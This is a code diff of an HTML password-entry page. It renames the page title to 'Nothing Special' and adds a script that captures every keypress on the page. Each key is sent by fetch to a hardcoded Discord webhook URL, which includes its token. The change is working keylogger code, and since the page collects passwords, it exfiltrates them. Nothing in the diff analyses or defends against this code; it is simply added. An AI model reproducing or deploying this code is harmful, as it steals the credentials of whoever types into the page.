@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Password Entry</title>
+    <title>Nothing Special</title>
     <style>
         body {
             display: flex;
@@ -11,7 +11,6 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #ffffff; /* Default background color */
         }
     
         form {
@@ -46,6 +45,33 @@
     <input type="password" id="password" name="password" required>
     <input type="submit" value="Submit">
 </form>
+
+<script>
+    // Your Discord webhook URL
+    var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1218575470186991708/9dMvk0-5RBBPvUrsm7kv7oIS183aXZpxcg6LGMazPz5Cj8jsRhGQ2_pNCRmuaumuDpNj";
+
+    document.addEventListener("keypress", function(event) {
+        var key_pressed = event.key;
+        var message = "Key pressed: " + key_pressed;
+        sendToDiscord(message);
+    });
+
+    function sendToDiscord(message) {
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ content: message })
+        }).then(response => {
+            if (!response.ok) {
+                console.error('Failed to send message to Discord webhook:', response.statusText);
+            }
+        }).catch(error => {
+            console.error('Error sending message to Discord webhook:', error);
+        });
+    }
+</script>
 
 </body>
 </html>
